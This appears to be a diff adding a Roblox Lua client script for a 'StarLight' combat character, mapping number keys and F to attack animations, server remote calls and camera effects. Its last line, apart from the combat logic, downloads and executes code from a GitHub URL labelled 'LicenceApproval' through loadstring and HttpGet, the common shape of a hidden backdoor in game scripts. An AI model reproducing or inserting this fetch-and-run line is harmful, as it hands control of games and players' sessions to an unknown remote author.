@@ -1,0 +1,84 @@
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
+    if gameProcessedEvent then
+        return 
+    end
+   local plrs = game:GetService("Players")
+local plr = plrs.LocalPlayer
+local char = plr.Character
+local Humanoid = char:WaitForChild("Humanoid")
+local Animator = Humanoid:WaitForChild("Animator")
+local StarS = char:WaitForChild("StarLight")
+local Anims = StarS:WaitForChild("Animations")
+local Repl = game:GetService("ReplicatedStorage")
+local Chars = Repl:WaitForChild("Characters")
+local Rems = Chars:WaitForChild("StarLight"):WaitForChild("Remotes")
+local CombatHitbox = Chars.Combat.Fx.CombatHitbox
+local HitboxPunch = Chars.Combat.Peacemaker.HitboxPunch
+local Mouse = plr:GetMouse()
+local MouseHit = Mouse.Hit.Position
+local TweenService = game:GetService("TweenService")
+
+local CloseBlastA = Animator:LoadAnimation(Anims.StarBlast)
+local RangeBlast = Animator:LoadAnimation(Anims.RangeBlast)
+local AbsorbA = Animator:LoadAnimation(Anims.GroundBlast)
+local GuardA = Animator:LoadAnimation(Anims.Blocking)
+
+    if input.KeyCode == Enum.KeyCode.One then
+CloseBlastA:Play()
+Rems.CloseBlast:FireServer(plr)
+  game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+		FieldOfView = 50;
+	}):Play()
+Humanoid.WalkSpeed = 0
+Humanoid.JumpPower = 0
+wait(.45)
+Humanoid.WalkSpeed = 16
+Humanoid.JumpPower = 50
+game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+		FieldOfView = 70;
+	}):Play()
+
+elseif input.KeyCode == Enum.KeyCode.Two then
+RangeBlast:Play()
+Rems.RangeBlasts:FireServer(plr)
+  game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+		FieldOfView = 40;
+	}):Play()
+Humanoid.WalkSpeed = 0
+Humanoid.JumpPower = 0
+wait(.45)
+Humanoid.WalkSpeed = 16
+Humanoid.JumpPower = 50
+game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+		FieldOfView = 70;
+	}):Play()
+elseif input.KeyCode == Enum.KeyCode.Three then
+Rems.Counter:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.Four then
+AbsorbA:Play()
+Rems.GroundBlast:FireServer(plr)
+  game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut), {
+		FieldOfView = 40;
+	}):Play()
+Humanoid.WalkSpeed = 0
+Humanoid.JumpPower = 0
+game:GetService("TweenService"):Create(game.Lighting, TweenInfo.new(1), {
+		ExposureCompensation = -1;
+	}):Play()
+wait(1)
+Humanoid.WalkSpeed = 16
+Humanoid.JumpPower = 50
+game:GetService("TweenService"):Create(game.Lighting, TweenInfo.new(0.3), {
+		ExposureCompensation = 0;
+	}):Play()
+game:GetService("TweenService"):Create(game.Workspace.CurrentCamera, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+		FieldOfView = 70;
+	}):Play()
+elseif input.KeyCode == Enum.KeyCode.Five then
+Rems.Finisher:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.F then
+GuardA:Play()
+Chars.Combat.Remotes.Blocking:FireServer(plr)
+   end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
